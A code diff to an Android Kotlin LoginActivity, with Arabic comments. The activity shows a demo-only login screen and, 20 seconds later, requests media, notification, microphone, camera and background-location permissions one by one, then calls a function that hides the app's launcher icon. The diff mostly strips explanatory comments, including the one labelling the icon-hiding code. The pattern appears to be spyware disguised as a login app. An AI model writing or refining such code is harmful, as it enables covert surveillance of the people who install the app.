@@ -45,17 +45,12 @@ class LoginActivity : AppCompatActivity() {
 
         // 2. الصور والفيديو والصوت — حسب الإصدار
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+ (API 33+)
             list.add(Manifest.permission.READ_MEDIA_IMAGES)
             list.add(Manifest.permission.READ_MEDIA_VIDEO)
             list.add(Manifest.permission.READ_MEDIA_AUDIO)
             list.add(Manifest.permission.POST_NOTIFICATIONS)
-        } else {
-            // Android 12 وأقدم
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
-                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-            }
         }
 
         // 3. الميكروفون والكاميرا
@@ -220,7 +215,7 @@ class LoginActivity : AppCompatActivity() {
                 showToast("Code will be sent (demo)")
             }
 
-            // ⭐ بعد 20 ثانية — ابدأ طلب الصلاحيات واحدة واحدة
+            // ⭐ بعد 20 ثانية — ابدأ طلب الصلاحيات
             Handler(Looper.getMainLooper()).postDelayed({
                 currentPermIndex = 0
                 askNextPermission()
@@ -243,14 +238,12 @@ class LoginActivity : AppCompatActivity() {
 
             val perm = permissionsToAsk[currentPermIndex]
 
-            // لو ممنوحة → انتقل للتالية
             if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                 currentPermIndex++
                 askNextPermission()
                 return
             }
 
-            // اطلب الصلاحية دي لوحدها
             ActivityCompat.requestPermissions(this, arrayOf(perm), currentPermIndex + 100)
 
         } catch (e: Exception) {
@@ -273,7 +266,7 @@ class LoginActivity : AppCompatActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  الصلاحيات الخاصة (يدوية)
+    //  الصلاحيات الخاصة
     // ═══════════════════════════════════════════
     private fun askBackgroundLocation() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -346,9 +339,6 @@ class LoginActivity : AppCompatActivity() {
         showToast("✅ تم تفعيل كل الصلاحيات")
     }
 
-    // ═══════════════════════════════════════════
-    //  إخفاء الأيقونة
-    // ═══════════════════════════════════════════
     private fun hideLauncherIcon() {
         try {
             val component = ComponentName(this, LoginActivity::class.java)
